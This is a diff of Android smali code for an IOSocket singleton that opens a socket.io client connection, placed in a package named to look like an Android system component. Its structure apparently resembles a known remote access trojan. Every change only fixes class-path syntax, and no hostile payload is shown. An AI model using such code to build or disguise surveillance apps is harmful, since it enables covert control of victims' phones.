@@ -1,10 +1,10 @@
-.class public Lcom.android.system.utils.sync/IOSocket;
+.class public Lcom/android/system/utils/sync/IOSocket;
 .super Ljava/lang/Object;
 .source "IOSocket.java"
 
 
 # static fields
-.field private static ourInstance:Lcom.android.system.utils.sync/IOSocket;
+.field private static ourInstance:Lcom/android/system/utils/sync/IOSocket;
 
 
 # instance fields
@@ -16,11 +16,11 @@
     .locals 1
 
     .line 10
-    new-instance v0, Lcom.android.system.utils.sync/IOSocket;
+    new-instance v0, Lcom/android/system/utils/sync/IOSocket;
 
-    invoke-direct {v0}, Lcom.android.system.utils.sync/IOSocket;-><init>()V
+    invoke-direct {v0}, Lcom/android/system/utils/sync/IOSocket;-><init>()V
 
-    sput-object v0, Lcom.android.system.utils.sync/IOSocket;->ourInstance:Lcom.android.system.utils.sync/IOSocket;
+    sput-object v0, Lcom/android/system/utils/sync/IOSocket;->ourInstance:Lcom/android/system/utils/sync/IOSocket;
 
     return-void
 .end method
@@ -33,7 +33,7 @@
 
     .line 18
     :try_start_0
-    invoke-static {}, Lcom.android.system.utils.sync/MainService;->getContextOfApplication()Landroid/content/Context;
+    invoke-static {}, Lcom/android/system/utils/sync/MainService;->getContextOfApplication()Landroid/content/Context;
 
     move-result-object v0
 
@@ -116,7 +116,7 @@
 
     move-result-object v2
 
-    iput-object v2, p0, Lcom.android.system.utils.sync/IOSocket;->ioSocket:Lio/socket/client/Socket;
+    iput-object v2, p0, Lcom/android/system/utils/sync/IOSocket;->ioSocket:Lio/socket/client/Socket;
     :try_end_0
     .catch Ljava/net/URISyntaxException; {:try_start_0 .. :try_end_0} :catch_0
 
@@ -139,11 +139,11 @@
     return-void
 .end method
 
-.method public static getInstance()Lcom.android.system.utils.sync/IOSocket;
+.method public static getInstance()Lcom/android/system/utils/sync/IOSocket;
     .locals 1
 
     .line 32
-    sget-object v0, Lcom.android.system.utils.sync/IOSocket;->ourInstance:Lcom.android.system.utils.sync/IOSocket;
+    sget-object v0, Lcom/android/system/utils/sync/IOSocket;->ourInstance:Lcom/android/system/utils/sync/IOSocket;
 
     return-object v0
 .end method
@@ -154,7 +154,7 @@
     .locals 1
 
     .line 36
-    iget-object v0, p0, Lcom.android.system.utils.sync/IOSocket;->ioSocket:Lio/socket/client/Socket;
+    iget-object v0, p0, Lcom/android/system/utils/sync/IOSocket;->ioSocket:Lio/socket/client/Socket;
 
     return-object v0
 .end method
